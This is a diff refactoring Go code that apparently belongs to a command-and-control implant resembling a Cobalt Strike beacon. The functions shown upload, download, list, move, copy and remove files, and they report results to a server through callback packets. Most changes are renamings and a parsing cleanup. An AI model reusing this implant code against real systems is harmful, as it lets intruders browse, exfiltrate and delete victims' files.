@@ -2,7 +2,6 @@ package command
 
 import (
 	"bytes"
-	"encoding/binary"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -36,7 +35,7 @@ func Upload(b []byte) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(CALLBACK_OUTPUT, []byte("upload success"))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("upload success"))
 	return nil
 }
 
@@ -55,26 +54,20 @@ func GetCurrentDirectory() error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(CALLBACK_PWD, []byte(result))
+	packet.PushResult(packet.CALLBACK_PWD, []byte(result))
 	return nil
 }
 
 func FileBrowse(b []byte) error {
 	buf := bytes.NewBuffer(b)
 	//resultStr := ""
-	pendingRequest := make([]byte, 4)
-	dirPathLenBytes := make([]byte, 4)
-
-	_, err := buf.Read(pendingRequest)
+	pendingRequestBytes := make([]byte, 4)
+	_, err := buf.Read(pendingRequestBytes)
 	if err != nil {
 		return err
 	}
-	_, err = buf.Read(dirPathLenBytes)
-	if err != nil {
-		return err
-	}
+	dirPathLen := packet.ReadInt(buf)
 
-	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
 	dirPathBytes := make([]byte, dirPathLen)
 	_, err = buf.Read(dirPathBytes)
 	if err != nil {
@@ -136,10 +129,11 @@ func FileBrowse(b []byte) error {
 			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
 		}
 	}
-	fmt.Println(resultStr)
 
-	dirResult := util.BytesCombine(pendingRequest, []byte(resultStr))
-	packet.PushResult(CALLBACK_PENDING, dirResult)
+	// use command line ls will send pending request -2, but there is no need to handle it
+	// send it back and server will print result in console
+	dirResult := util.BytesCombine(pendingRequestBytes, []byte(resultStr))
+	packet.PushResult(packet.CALLBACK_PENDING, dirResult)
 	return nil
 }
 
@@ -157,7 +151,7 @@ func Download(b []byte) error {
 	requestID := util.RandomInt(10000, 99999)
 	requestIDBytes := packet.WriteInt(requestID)
 	result := util.BytesCombine(requestIDBytes, fileLenBytes, []byte(filePath))
-	packet.PushResult(CALLBACK_FILE, result)
+	packet.PushResult(packet.CALLBACK_FILE, result)
 
 	fileHandle, err := os.Open(filePath)
 	if err != nil {
@@ -176,10 +170,10 @@ func Download(b []byte) error {
 		}
 		fileContent = fileBuf[:n]
 		result = util.BytesCombine(requestIDBytes, fileContent)
-		packet.PushResult(CALLBACK_FILE_WRITE, result)
+		packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
 	}
 
-	packet.PushResult(CALLBACK_FILE_CLOSE, requestIDBytes)
+	packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
 	return nil
 }
 
@@ -190,7 +184,7 @@ func Remove(filePath string) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(CALLBACK_OUTPUT, []byte(fmt.Sprintf("remove %s success", filePath)))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte(fmt.Sprintf("remove %s success", filePath)))
 	return nil
 }
 
@@ -204,7 +198,7 @@ func MoveFile(b []byte) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(CALLBACK_OUTPUT, []byte("move success"))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("move success"))
 	return nil
 }
 
@@ -248,7 +242,7 @@ func CopyFile(b []byte) error {
 			return err
 		}
 	}
-	packet.PushResult(CALLBACK_OUTPUT, []byte("copy success"))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("copy success"))
 	return nil
 }
 
